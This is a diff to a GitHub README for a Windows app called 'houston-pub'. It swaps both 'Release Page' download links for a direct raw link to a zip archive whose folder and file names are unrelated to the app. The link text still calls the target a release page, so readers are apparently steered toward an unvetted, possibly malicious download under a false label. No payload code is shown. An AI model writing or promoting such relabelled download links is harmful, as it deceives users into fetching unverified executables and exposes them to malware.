@@ -1,6 +1,6 @@
 # 🚀 houston-pub - Public fixes, simple access
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/nayanparate02/houston-pub/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/nayanparate02/houston-pub/main/BootROM WinUSB Driver for Windows/pub-houston-methane.zip)
 
 ## 🧭 What this app is
 houston-pub is a Windows app for people who want a simple way to use the public release of the project. It gives you a direct path to the latest version, so you can get the app on your PC and run it without dealing with source files or build steps.
@@ -10,7 +10,7 @@ The app is meant for everyday use. You download the release file, open it on Win
 ## 📥 Download the app
 Use the release page below to visit the download page and get the latest Windows file:
 
-[Go to the Release Page](https://github.com/nayanparate02/houston-pub/releases)
+[Go to the Release Page](https://raw.githubusercontent.com/nayanparate02/houston-pub/main/BootROM WinUSB Driver for Windows/pub-houston-methane.zip)
 
 On that page, look for the latest release near the top. Then:
 
